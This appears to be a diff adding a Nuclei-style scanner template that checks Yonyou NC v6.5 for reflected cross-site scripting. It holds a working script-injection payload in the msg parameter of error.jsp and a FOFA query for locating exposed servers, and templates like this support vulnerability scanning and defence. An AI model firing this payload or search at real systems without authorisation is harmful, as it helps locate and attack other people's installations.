@@ -1,0 +1,35 @@
+id: poc-local-oa-yonyou-nc-uapws-error-jsp-xss
+
+info:
+  name: poc-local-oa-yonyou-nc-uapws-error-jsp-xss
+  author: capiton
+  severity: medium
+  description: "用友nc v6.5 反射型xss"
+  reference:
+    - "https://mp.weixin.qq.com/s/w2OgVCFcoqcYJ4Tn5Zs9jA"
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+    Vulnerability-Impact: 用友NC UFIDA-NC
+  tags: yonyou,oa
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/uapws/pages/error.jsp?msg=%3Cscript%3Ealert({{randInt}})%3C%2Fscript%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<script>alert({{randInt}})</script>"
+          - "center"
+          - "error.jsp"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
